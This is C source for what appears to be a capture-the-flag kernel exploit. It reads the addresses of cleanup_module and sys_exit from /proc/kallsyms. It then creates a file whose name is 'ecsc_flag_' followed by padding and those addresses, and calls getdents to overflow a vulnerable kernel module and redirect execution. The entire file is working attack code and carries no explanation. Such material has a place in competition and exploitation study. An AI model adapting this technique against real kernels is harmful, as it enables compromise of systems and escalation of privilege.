#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <endian.h>
#include <stdint.h>

uint64_t get_addr(char *target) {

    FILE *kallsyms = fopen("/proc/kallsyms", "r");
    if (!kallsyms) {
        printf("-- failed to open kallsyms\n");
        return 0;
    }

    uint64_t addr;
    char type;
    char name[256];
    char line[256];

    printf("-- searching for function: %s\n", target);

    while (fgets(line, sizeof(line), kallsyms)) {
        if (sscanf(line, "%lx %c %255s", &addr, &type, name) >= 3) {
            if (strcmp(target, name) == 0) {
                fclose(kallsyms);
                return addr;
            }
        }
    }

    fclose(kallsyms);
    printf("-- address of %s not found\n", target);
    return 0;
}

int main() {

	FILE *f;
	char filename[256];
	char buf[256];

	printf("-- starting exploit\n");
	uint64_t cleanup_module = get_addr("cleanup_module");
	printf("-- cleanup_module addr: 0x%lx\n", cleanup_module);
	uint64_t sys_exit = get_addr("sys_exit");
	printf("-- sys_exit addr: 0x%lx\n", sys_exit);

	memset(filename, 0, sizeof(filename));

	printf("-- constructing payload\n");
	strcpy(filename, "ecsc_flag_");
    size_t offset = strlen(filename);

	memset(filename + offset, 0x41, 102);
    offset += 102;

	memcpy(filename + offset, &cleanup_module, sizeof(uint64_t));
    offset += sizeof(uint64_t);

	memcpy(filename + offset, &sys_exit, sizeof(uint64_t));
    offset += sizeof(uint64_t);

	printf("-- creating malicious file\n");
	f = fopen(filename, "w");
	fclose(f);

	printf("-- triggering vuln\n");
	int dirfd = open(".", O_RDONLY);
	syscall(SYS_getdents, dirfd, buf, sizeof(buf));

	return 0;

}

